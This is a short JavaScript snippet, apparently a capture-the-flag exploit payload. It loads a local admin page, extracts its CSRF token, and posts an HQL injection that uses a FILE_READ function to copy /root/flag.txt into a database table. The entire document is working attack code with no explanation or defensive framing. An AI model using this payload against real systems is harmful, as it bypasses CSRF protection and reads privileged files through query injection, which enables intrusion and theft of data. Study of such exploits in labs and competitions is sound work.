fetch('http://127.0.0.1/admin')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
    const payload = `INSERT INTO ScrapeResult (url, pageTitle, classification, threatScore, timestamp) SELECT 'pwned', FUNCTION('FILE_READ', '/root/flag.txt'), 'FLAG', 99, CURRENT_TIMESTAMP FROM ScrapeResult s`;
    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(payload) + '&csrf=' + csrf
    });
  });
